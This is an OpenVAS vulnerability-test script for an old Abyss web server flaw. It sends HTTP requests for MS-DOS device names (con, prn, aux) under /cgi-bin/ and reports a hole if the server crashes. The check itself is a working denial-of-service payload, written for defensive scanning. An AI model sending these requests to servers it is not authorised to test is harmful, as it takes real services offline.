# OpenVAS Vulnerability Test
# $Id: abyss_msdos_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Abyss httpd DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the web server by sending a MS-DOS device 
names in an HTTP request.

An attacker may use this flaw to prevent this host from performing its 
job properly.";

tag_solution = "Upgrade your web server to the latest version";

#  Ref: R00tCr4ck <root@cyberspy.org>

if(description)
{
 script_id(15563);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_xref(name:"OSVDB", value:"11006");
 script_tag(name:"cvss_base", value:"7.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");

 name = "Abyss httpd DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Try to pass a MS-DOS device name to crash the remote web server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);
if(! get_port_state(port)) exit(0);
if(http_is_dead(port:port))exit(0);

function check(pt,dev)
{
  req = string("GET /cgi-bin/",dev," HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n\r\n");
  soc = http_open_socket(pt);
  if(! soc) exit(0);

  send(socket:soc, data: req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port: pt)) { security_hole(pt); exit(0);}
}

dev_name=make_list("con","prn","aux");
foreach devname (dev_name)
{
  check(pt:port, dev:devname);
}
